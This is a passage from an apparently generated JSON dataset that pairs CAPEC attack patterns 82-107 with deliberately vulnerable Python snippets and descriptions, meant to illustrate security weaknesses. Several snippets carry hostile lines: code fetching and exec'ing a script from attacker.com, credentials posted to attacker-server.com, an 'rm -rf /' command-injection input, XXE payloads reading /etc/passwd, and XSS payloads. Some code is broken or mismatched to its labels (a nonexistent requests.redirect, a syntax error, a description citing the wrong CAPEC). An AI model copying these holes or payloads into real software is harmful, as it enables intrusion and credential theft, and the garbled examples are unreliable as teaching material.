        "code_snippet": "import logging\n\n# CWE-20: Improper Input Validation\n# CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)\n# CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')\n# CWE-116: Improper Encoding or Escaping of Output\n# CWE-117: Improper Output Neutralization for Logs\n\nlog_file = 'log.txt'\n\ndef log_message(message):\n    logging.basicConfig(filename=log_file, format='%(message)s', level=logging.INFO)\n    logging.info(message)\n\n# CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\nuser_input = input('Enter a message to log: ')\n\n# CWE-221: Information Loss or Omission\n# CWE-276: Incorrect Default Permissions\n# CWE-279: Incorrect Execution-Assigned Permissions\n\nlog_message(user_input)\n\n# CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\nwith open(log_file, 'a') as f:\n    f.write('\\nSystem Compromised!\\n')",
        "description": "This Python code snippet demonstrates a vulnerable logging mechanism that allows an attacker to inject malicious data into the log file, tampering with the log contents. The code lacks proper input validation, sanitization, and encoding, making it susceptible to various attacks, including CRLF injection, special element injection, and log tampering. The code also exhibits incorrect default permissions and execution-assigned permissions, further exacerbating the vulnerability."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No XML validation against a schema\n        # No neutralization of special XML elements\n        # No restriction of XML external entity references\n        # No control over recursive entity definitions in DTDs\n        return root\n    except ET.ParseError:\n        return None\n\n# Example usage:\nxml_string = '<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> <doc>&xxe;</doc>'\nprocess_xml(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that is susceptible to various XML-based attacks. It lacks XML validation against a schema (CWE-112), fails to neutralize special XML elements (CWE-91), and does not restrict XML external entity references (CWE-611). Additionally, it does not control recursive entity definitions in DTDs (CWE-776), making it vulnerable to XML Entity Expansion attacks."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_user_data(username):\n    doc = ET.parse('users.xml')\n    root = doc.getroot()\n    xpath_expression = f\"/users/user[username='{username}']\"\n    user_node = root.find(xpath_expression)\n    if user_node is not None:\n        return user_node.find('password').text\n    else:\n        return None\n\nusername = input('Enter your username: ')\npassword = get_user_data(username)\nif password is not None:\n    print(f'Your password is: {password}')\nelse:\n    print('User not found')",
        "description": "This Python code snippet demonstrates XPath Injection (CAPEC) by dynamically constructing an XPath expression using user-controllable input (CWE-643). The input is not properly sanitized, allowing an attacker to inject malicious XPath expressions to bypass authentication or retrieve sensitive information. The code uses the ElementTree library to parse an XML file and retrieve user data based on the input username. The lack of input validation (CWE-20) and improper neutralization of special elements (CWE-91, CWE-74, CWE-707) makes the code vulnerable to XPath Injection attacks."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_data(xml_string, xpath_expression):\n    root = ET.fromstring(xml_string)\n    return root.findall(xpath_expression)\n\nxml_string = '<root><person><name>John</name><age>30</age></person></root>'\nuser_input = input('Enter XPath expression: ')\nprint(get_data(xml_string, user_input))",
        "description": "This Python code snippet demonstrates XQuery injection vulnerability. The `get_data` function takes an XML string and an XPath expression as input, and returns the result of the XPath query. The XPath expression is provided by the user, and is not properly sanitized, allowing an attacker to inject malicious XPath expressions to access unauthorized data or execute commands."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import requests\n\najax_app = 'https://example.com/ajax_app'\n\ndef footprint_target_environment():\n    # CWE-20: Improper Input Validation\n    user_input = input('Enter a URL to scan: ')\n    if not user_input.startswith('http'): user_input = 'http://' + user_input\n    \n    # CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    malicious_script = '<script>alert(1)</script>'\n    payload = {'user_input': malicious_script}\n    \n    # CWE-348: Use of Less Trusted Source\n    trusted_source = requests.get(ajax_app, params=payload)\n    untrusted_source = requests.get(user_input, params=payload)\n    \n    # CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n    headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'CR LF': 'Injected Header'}\n    response = requests.get(ajax_app, headers=headers)\n    \n    # CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\n    static_code = '<% eval(requests.get(ajax_app).text) %>'\n    \n    # CWE-116: Improper Encoding or Escaping of Output\n    encoded_output = response.text.encode('utf-8')\n    \n    # CWE-184: Incomplete List of Disallowed Inputs\n    disallowed_inputs = ['<script>', '<iframe>']\n    if any(i in encoded_output for i in disallowed_inputs): print('Potential XSS vulnerability found')\n    \n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    invalid_characters = ['<', '>', ';', '=']\n    if any(i in encoded_output for i in invalid_characters): print('Potential XSS vulnerability found')\n    \n    # CWE-692: Incomplete Denylist to Cross-Site Scripting\n    denylist = ['<script>alert(1)</script>']\n    if any(i in encoded_output for i in denylist): print('Potential XSS vulnerability found')\n\nfootprint_target_environment()",
        "description": "This Python code snippet demonstrates the CAPEC attack by simulating an Ajax conversation to footprint a target environment. It incorporates various CWEs, including improper input validation, cross-site scripting, HTTP request/response splitting, static code injection, improper encoding or escaping of output, incomplete list of disallowed inputs, improper neutralization of invalid characters, and incomplete denylist to cross-site scripting. The code sends malicious requests to the target environment, attempting to exploit these vulnerabilities and detect potential weaknesses."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    referrer = request.headers.get('Referer')\n    return '<script>alert(\"Referrer: ' + referrer + '\");</script>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet using Flask framework demonstrates a vulnerable web application that is susceptible to XSS in HTTP Headers attack. It retrieves the 'Referer' HTTP header and injects it into the HTML response without proper validation or neutralization, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/admin/delete_user/<username>')\ndef delete_user(username):\n    # No authorization check is performed\n    return f'User {username} deleted successfully'\n\n@app.route('/admin/create_user/<username>')\ndef create_user(username):\n    # No authorization check is performed\n    return f'User {username} created successfully'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code snippet demonstrates forceful browsing vulnerability. The Flask web application has two routes, '/admin/delete_user/<username>' and '/admin/create_user/<username>', that can be accessed directly without any authorization checks. An attacker can exploit this by directly accessing these URLs, bypassing any intended access controls."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import subprocess\n\ndef execute_command(ip_address):\n    command = \"ping -c 1 \" + ip_address\n    subprocess.call(command, shell=True)\n\n# Vulnerable function call\nexecute_command(\"127.0.0.1; rm -rf /\")",
        "description": "This Python code snippet demonstrates OS Command Injection vulnerability. The 'execute_command' function takes an IP address as input and constructs a 'ping' command using the input. The 'subprocess.call' function is used to execute the command. However, the 'shell=True' argument allows the command to be executed through the shell, making it vulnerable to OS Command Injection. An attacker can inject malicious commands by providing a specially crafted input, such as '127.0.0.1; rm -rf /', which would delete all files in the root directory."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport urllib.parse\n\n# CWE-346: Origin Validation Error\nurl = 'http://example.com'\nhostname = urllib.parse.urlparse(url).hostname\nip_address = socket.gethostbyname(hostname)\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nreverse_dns = socket.gethostbyaddr(ip_address)[0]\nif reverse_dns != hostname:\n    # No validation, allowing pharming attack\n    pass\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# No server-side validation, relying on client-side validation\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nuser_input = '<script>alert(\"Pharming attack\")</script>'\nprint(f'<html><body>{user_input}</body></html>')\n\n# CWE-494: Download of Code Without Integrity Check\n# Downloading and executing code from untrusted source\nexec(urllib.request.urlopen('http://attacker.com/malicious_code.py').read())",
        "description": "This code snippet demonstrates a pharming attack by exploiting multiple vulnerabilities. It fails to properly validate the origin of the data, relies on reverse DNS resolution for security-critical actions, and enforces security mechanisms on the client-side. Additionally, it is vulnerable to cross-site scripting and downloads code without integrity checks, allowing an attacker to impersonate a trusted site and steal sensitive data."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-303: Incorrect Implementation of Authentication Algorithm\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-305: Authentication Bypass by Primary Weakness\n# CWE-290: Authentication Bypass by Spoofing\n\ndef authenticate(username, password, server_socket):\n    # Simple authentication protocol susceptible to reflection attack\n    challenge = server_socket.recv(1024)\n    response = hashlib.sha256((username + password + challenge).encode()).hexdigest()\n    server_socket.send(response.encode())\n\n    # CWE-294: Authentication Bypass by Capture-replay\n    # An attacker can capture the response and replay it to bypass authentication\n    # CWE-305: Authentication Bypass by Primary Weakness\n    # The authentication algorithm is sound, but the implemented mechanism can be bypassed\n    # CWE-290: Authentication Bypass by Spoofing\n    # Incorrectly implemented authentication schemes subject to spoofing attacks\n\n    # Reflection attack: an adversary can impersonate a legitimate user\n    # by sending the captured response back to the server\n    server_socket.send(response.encode())\n\n# Example usage\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.connect(('localhost', 8080))\nauthenticate('username', 'password', server_socket)",
        "description": "A Python code snippet demonstrating a simple authentication protocol susceptible to reflection attacks, which can be exploited by an adversary to gain illegitimate access to the system. The code includes vulnerabilities related to CWE-301, CWE-303, CWE-294, CWE-305, and CWE-290, making it vulnerable to authentication bypass attacks."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "img_tag = '<img src=\"javascript:alert(1)\" />'\nprint('<html><body>' + img_tag + '</body></html>')",
        "description": "This Python code snippet demonstrates a vulnerable web application that does not neutralize scripting elements within attributes of HTML IMG tags, allowing an attacker to inject malicious JavaScript code. The code takes user-controlled input and injects it into the src attribute of an IMG tag, making it vulnerable to XSS attacks (CWE-82, CWE-87, CWE-80, CWE-692, CWE-85)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "def vulnerable_function(size):\n    # CWE-190: Integer Overflow or Wraparound\n    # CWE-680: Integer Overflow to Buffer Overflow\n    buffer_size = size + 100\n    if buffer_size > 0xFFFFFFFF:\n        buffer_size = 0\n    buffer = [0] * buffer_size\n    # CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n    # CWE-122: Heap-based Buffer Overflow\n    data = [1] * (size + 100)\n    for i in range(size + 100):\n        buffer[i] = data[i]\n    return buffer\n\nvulnerable_function(0xFFFFFFFF - 100)\n",
        "description": "This Python code snippet demonstrates an integer overflow vulnerability. The function vulnerable_function() takes an integer size as input and attempts to allocate a buffer of size + 100. However, if size is close to the maximum value of an unsigned integer (0xFFFFFFFF), the addition will cause an integer overflow, resulting in a small buffer size. The function then copies data into the buffer without checking the size of the input, leading to a buffer overflow. This can cause unexpected behavior, including the execution of arbitrary code."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# CWE-117: Improper Output Neutralization for Logs\n# CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)\n# CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\n\nlogging.basicConfig(filename='log_file.log', level=logging.INFO)\n\nuser_input = input('Enter your username: ')\n\n# No input validation or sanitization\nlogging.info('User ' + user_input + ' logged in successfully')\n\n# CWE-779: Logging of Excessive Data\nfor i in range(1000):\n    logging.info('Excessive logging ' + str(i))\n\n# CWE-532: Insertion of Sensitive Information into Log File\nlogging.info('User credit card number: 1234-5678-9012-3456')",
        "description": "This Python code snippet demonstrates the CAPEC attack by injecting malicious log entries into a log file. The code lacks input validation and sanitization, allowing an attacker to inject special elements or control sequences into the log file. Additionally, the code logs excessive data and sensitive information, making it vulnerable to CWE-117, CWE-75, CWE-150, CWE-532, and CWE-779."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-593: Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created\n# CWE-287: Improper Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef vulnerable_communication():\n    # Create a socket object\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    # Wrap the socket with SSL/TLS\n    ssl_sock = ssl.wrap_socket(sock, server_side=False, cert_reqs=ssl.CERT_NONE, ca_certs=None, keyfile=None, certfile=None)\n    # Connect to the server\n    ssl_sock.connect((\"server_ip\", 443))\n    # Send a fake authentication request\n    ssl_sock.send(b\"fake_auth_request\")\n    # Receive the response\n    response = ssl_sock.recv(1024)\n    # Replay the response to bypass authentication\n    ssl_sock.send(response)\n    # Receive the sensitive data\n    sensitive_data = ssl_sock.recv(1024)\n    print(sensitive_data.decode())\n\nvulnerable_communication()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel between a client and a server. The client sends a fake authentication request, receives the response, and replays it to bypass authentication and obtain sensitive data. This code embodies the CAPEC of targeting the communication between two components to alter or obtain data from transactions, and is related to CWEs 300, 290, 593, 287, and 294."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nwsdl_file = 'vulnerable_service.wsdl'\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_tree = ET.parse(wsdl_file)\nwsdl_root = wsdl_tree.getroot()\n\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\nsensitive_info = {'database_username': 'admin', 'database_password': 'password'}\nwsdl_root.append(ET.Element('sensitiveInfo', sensitive_info))\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\naccess_control_list = {'admin': 'full_access', 'user': 'read_only'}\nwsdl_root.append(ET.Element('accessControlList', access_control_list))\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nimport urllib.parse\n\ndef vulnerable_service():\n    query_string = urllib.parse.urlencode({'username': 'admin', 'password': 'password'})\n    return f'http://example.com/vulnerable_service?{query_string}'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport platform\n\ndef get_system_info():\n    return {'platform': platform.system(), 'release': platform.release(), 'version': platform.version()}\n\nwsdl_root.append(ET.Element('systemInfo', get_system_info()))\n\nET.indent(wsdl_root, space='\\t')\nwsdl_tree.write(wsdl_file)",
        "description": "This Python code snippet generates a vulnerable WSDL file that exposes sensitive information, including database credentials, access control lists, and system information. The WSDL file is then made accessible to unauthorized actors, allowing them to exploit this information for further attacks."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import ctypes\n\n# CWE-589: Using a non-ubiquitous API\ntry:\n    libc = ctypes.CDLL('libc.so.6')\n    libc.geteuid()\nexcept AttributeError:\n    # CWE-1177: Using a prohibited function\n    from prohibited_library import prohibited_function\n    prohibited_function()\n\n# CWE-119: Improper restriction of operations within the bounds of a memory buffer\nbuffer = bytearray(10)\nindex = 15\ntry:\n    buffer[index] = 0x01\nexcept IndexError:\n    pass\n\n# CWE-1322: Using blocking code in single-threaded, non-blocking context\nimport time\ntry:\n    time.sleep(10)\nexcept RuntimeError:\n    pass\n\n# CWE-829: Inclusion of functionality from untrusted control sphere\nfrom untrusted_library import untrusted_function\nuntrusted_function()\n",
        "description": "This Python code snippet demonstrates the CAPEC of blocked access to external libraries. It includes CWE-589 by using a non-ubiquitous API, CWE-1177 by using a prohibited function, CWE-119 by performing operations outside the bounds of a memory buffer, CWE-1322 by using blocking code in a single-threaded context, and CWE-829 by including functionality from an untrusted control sphere. The code intentionally includes insecure practices to illustrate the CAPEC."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import hashlib\nimport os\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# Using MD5 which is considered broken\nhash = hashlib.md5()\n\n# CWE-1204: Generation of Weak Initialization Vector (IV)\n# Using a fixed IV\niv = b'\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x14\\x15'\n\n# CWE-1240: Use of a Cryptographic Primitive with a Risky Implementation\n# Using a custom implementation of AES\nclass AES:\n    def __init__(self, key):\n        self.key = key\n    def encrypt(self, plaintext):\n        return ''.join([chr(ord(c) ^ ord(self.key[i % len(self.key)])) for i, c in enumerate(plaintext)])\n\n# CWE-1241: Use of Predictable Algorithm in Random Number Generator\n# Using a predictable random number generator\nimport random\nrandom.seed(42)\n\n# CWE-1279: Cryptographic Operations are run Before Supporting Units are Ready\n# Performing cryptographic operations without ensuring that the supporting inputs are ready\nkey = os.urandom(16)\nif not key:\n    key = 'default_key'\n\naes = AES(key)\nplaintext = 'This is a secret message'\nciphertext = aes.encrypt(plaintext)\nprint(ciphertext)\n",
        "description": "This code snippet demonstrates the CAPEC of Cryptanalysis by using a broken cryptographic algorithm (MD5), a weak initialization vector, a risky implementation of AES, a predictable random number generator, and performing cryptographic operations without ensuring that the supporting inputs are ready. An attacker may be able to exploit these weaknesses to decipher the ciphertext without knowing the secret key."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import requests\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_to_untrusted_site(url):\n    return requests.redirect(url, allow_redirects=True)\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\ndef phishing_attack(user_input):\n    # Spoofed login page\n    login_page = '<html><body><h1>Login Page</h1><form action=\"/login\" method=\"post\"><label for=\"username\">Username:</label><br><input type=\"text\" id=\"username\" name=\"username\"><br><label for=\"password\">Password:</label><br><input type=\"password\" id=\"password\" name=\"password\"><br><input type=\"submit\" value=\"Login\"></form></body></html>'\n    # Send the spoofed login page to the user\n    return login_page\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\ndef collect_user_credentials(user_input):\n    # Collect user credentials\n    username = user_input['username']\n    password = user_input['password']\n    # Send the collected credentials to the attacker's server\n    requests.post('https://attacker-server.com/collect_credentials', json={'username': username, 'password': password})\n\n# Phishing attack\nuser_input = {'username': 'user', 'password': 'password'}\nphishing_attack(user_input)\nredirect_to_untrusted_site('https://attacker-server.com/collect_credentials')\ncollect_user_credentials(user_input)",
        "description": "This code snippet demonstrates a phishing attack where a user is redirected to a spoofed login page, and their credentials are collected and sent to the attacker's server. The code uses CWE-601 to redirect the user to an untrusted site, CWE-451 to misrepresent critical information, CWE-506 and CWE-507 to embed malicious code, and CWE-512 to collect personally identifiable information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation against a schema\n        # No neutralization of special XML elements\n        # No restriction on external entity references\n        return root.find('.//username').text\n    except ET.ParseError:\n        return 'Error parsing XML'\n\nxml_string = '<!DOCTYPE doc [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><users><user><username>&ent;</username></user></users>'\nprint(process_xml(xml_string))",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that is susceptible to XML injection, missing XML validation, and improper restriction of XML external entity references. The function parses an XML string without validating it against a schema, neutralizing special XML elements, or restricting external entity references, making it vulnerable to attacks."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "def vulnerable_function(user_input):\n    buffer = bytearray(10)\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n    return buffer\n\nuser_input = b'a' * 20\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerable_function` takes a user input and copies it into a fixed-size buffer without checking the size of the input, leading to a buffer overflow. This is an example of CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'). The function uses an untrusted input to calculate an array index without proper validation, which is CWE-129: Improper Validation of Array Index. Additionally, the code does not correctly calculate the size to be used when allocating the buffer, which is CWE-131: Incorrect Calculation of Buffer Size. The code also accesses the buffer with an incorrect length value, which is CWE-805: Buffer Access with Incorrect Length Value. This can lead to a buffer overflow, allowing an adversary to write past the boundaries of the allocated buffer region in memory, causing a program crash or potentially redirection of execution as per the adversary's choice, as described in CAPEC-100: Buffer Overflow."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "import os\n\ndef vulnerable_ssiInjection(url):\n    ssi_injection = \"<!--#exec cmd='\" + url + \"' -->\"\n    with open(\"vulnerable.html\", \"w\") as f:\n        f.write(\"<html><body>\" + ssi_injection + \"</body></html>\")\n    os.system(\"perl /usr/lib/cgi-bin/cat /vulnerable.html\")",
        "description": "This Python code snippet demonstrates Server Side Include (SSI) Injection vulnerability. It creates an HTML file with an SSI directive that executes a shell command, allowing an attacker to inject malicious code. The code does not properly validate user input, neutralize special elements, or enforce server-side security, making it vulnerable to SSI injection attacks."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import socket\nimport http.client\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-522: Insufficiently Protected Credentials\n# CWE-523: Unprotected Transport of Credentials\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to the target server\nserver_address = ('target_server', 80)\nsock.connect(server_address)\n\n# Send a request to the server to capture the session token\nrequest = 'GET /login HTTP/1.1\\r\\nHost: target_server\\r\\n\\r\\n'\nsock.send(request.encode())\n\n# Receive the response and extract the session token\nresponse = sock.recv(1024)\n\n# CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n# The session token is sent in plaintext over HTTP\nsession_token = response.decode().split('\\n')[1].split(':')[1].strip()\n\n# Use the captured session token to impersonate the victim\nrequest = 'GET /protected_resource HTTP/1.1\\r\\nHost: target_server\\r\\nCookie: session_token=' + session_token + '\\r\\n\\r\\n'\nsock.send(request.encode())\n\n# Receive the response\nresponse = sock.recv(1024)\nprint(response.decode())",
        "description": "This Python code snippet demonstrates a session sidejacking attack, where an attacker captures a session token sent in plaintext over HTTP and uses it to impersonate the victim. The code connects to a target server, sends a request to capture the session token, extracts the token from the response, and then uses the token to access a protected resource."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import tkinter as tk\nfrom tkinter import ttk\n\nclass MaliciousApp:\n    def __init__(self, master):\n        self.master = master\n        self.frame = ttk.Frame(self.master)\n        self.frame.pack()\n        self.button = ttk.Button(self.frame, text=\"Click me\", command=self.victim_interaction)\n        self.button.pack()\n\n    def victim_interaction(self):\n        # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        # Create a new window that looks like a login page\n        self.login_window = tk.Toplevel(self.master)\n        self.login_window.title(\"Login\")\n        self.login_label = ttk.Label(self.login_window, text=\"Enter your credentials\")\n        self.login_label.pack()\n        self.login_entry = ttk.Entry(self.login_window)\n        self.login_entry.pack()\n        self.login_button = ttk.Button(self.login_window, text=\"Login\", command=self.steal_credentials)\n        self.login_button.pack()\n\n    def steal_credentials(self):\n        # CWE-368: Context Switching Race Condition\n        # Switch to a new context to steal credentials\n        self.stolen_credentials = self.login_entry.get()\n        # CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n        # Call a malicious function to send the stolen credentials\n        self.send_credentials(self.stolen_credentials)\n\n    def send_credentials(self, credentials):\n        # CWE-506: Embedded Malicious Code\n        # Send the stolen credentials to the attacker's server\n        import requests\n        requests.post(\"https://attacker-server.com/steal\", data={\"credentials\": credentials})\n\n    def misinterpret_input(self, input):\n        # CWE-115: Misinterpretation of Input\n        # Misinterpret the input to perform a malicious action\n        if input == \"admin\":\n            self.perform_malicious_action()\n\n    def perform_malicious_action(self):\n        # Perform a malicious action\n        print(\"Malicious action performed\")\n\nroot = tk.Tk()\napp = MaliciousApp(root)\nroot.mainloop()",
        "description": "This code snippet demonstrates the CAPEC where an adversary tricks a victim into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different system. The code creates a malicious application that tricks the user into entering their credentials, which are then sent to the attacker's server. The code uses various CWEs to achieve this, including CWE-1021 to create a fake login page, CWE-368 to switch to a new context to steal credentials, CWE-1265 to call a malicious function to send the stolen credentials, CWE-506 to embed malicious code to send the credentials, and CWE-115 to misinterpret the input to perform a malicious action."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import os\n\n# CWE-250: Execution with Unnecessary Privileges\n# CWE-638: Not Using Complete Mediation\n# CWE-285: Improper Authorization\n\ndef elevated_privileges():\n    # Run with elevated privileges\n    os.setuid(0)\n    os.setgid(0)\n\n    # CWE-116: Improper Encoding or Escaping of Output\n    user_input = input('Enter your username: ')\n    encoded_input = user_input.encode('utf-8')\n    print(f'Welcome, {encoded_input.decode(\"utf-8\")}!')\n\n    # CWE-20: Improper Input Validation\n    user_data = input('Enter your data: ')\n    if user_data.isdigit():\n        print(f'You entered a digit: {user_data}')\n    else:\n        print(f'You entered a string: {user_data}')\n\n    # Load unsigned ActiveX control\n    activex_control = '<object id=\"myActivex\" classid=\"clsid:...\">'</n    print(activex_control)\n\n# Run with elevated privileges\nelevated_privileges()",
        "description": "This Python code snippet demonstrates a privilege elevation attack by bypassing security zone controls in a web browser. It executes with unnecessary privileges, lacks complete mediation, and performs improper authorization. Additionally, it showcases improper encoding or escaping of output and improper input validation. The code loads an unsigned ActiveX control, which can lead to the execution of malicious code."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "import requests\n\nproxy_url = 'http://example.com/proxy'\n\ndef split_http_request(request):\n    # CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n    request += '\\r\\n' + 'Injected-Header: malicious-value'\n    return request\n\ndef send_request(request):\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n    # CWE-138: Improper Neutralization of Special Elements\n    # CWE-436: Interpretation Conflict\n    # CWE-444: Inconsistent Interpretation of HTTP Requests\n    response = requests.post(proxy_url, data={'request': request}, headers={'Content-Type': 'application/x-www-form-urlencoded'})\n    return response.text\n\nrequest = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nmalicious_request = split_http_request(request)\nresponse = send_request(malicious_request)\nprint(response)",
        "description": "This code snippet demonstrates HTTP Request Smuggling (CAPEC-273) by exploiting inconsistencies in HTTP request parsing between a proxy server and a backend web server. The `split_http_request` function injects a malicious HTTP header into the original request, which is then sent to the proxy server. The `send_request` function sends the modified request to the proxy server, which may interpret it differently than the backend web server, allowing the malicious request to be smuggled through."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\n\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\ndef generate_webpage(user_input):\n    webpage = '<img src=\"' + user_input + '\" />'\n    return webpage\n\nuser_input = '<script>alert(\"XSS\")</script>'\nlogging.info('User input: ' + user_input)\nprint(generate_webpage(user_input))",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to Cross-Site Scripting (XSS) attacks. The application logs user input without proper sanitization, allowing an attacker to inject malicious scripts. The generate_webpage function takes user input and injects it into an HTML IMG tag without neutralizing the input, making it vulnerable to CWE-82. The logging mechanism used is also vulnerable to CWE-533 and CWE-534, as it logs sensitive information without proper access control. The code also demonstrates an incomplete denylist-based protection mechanism, making it vulnerable to CWE-692. The user_input variable contains a malicious script that will be executed when the generated webpage is loaded, demonstrating CWE-79."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if flask.request.method == 'POST':\n        html = '<html><body><h1>You sent: ' + flask.request.form['user_input'] + '</h1></body></html>'\n        return html\n    return '<form action=\"/vulnerable\" method=\"post\"><input type=\"text\" name=\"user_input\"/><input type=\"submit\"/></form>'\n\nif __name__ == '__main__':\n    app.run()",
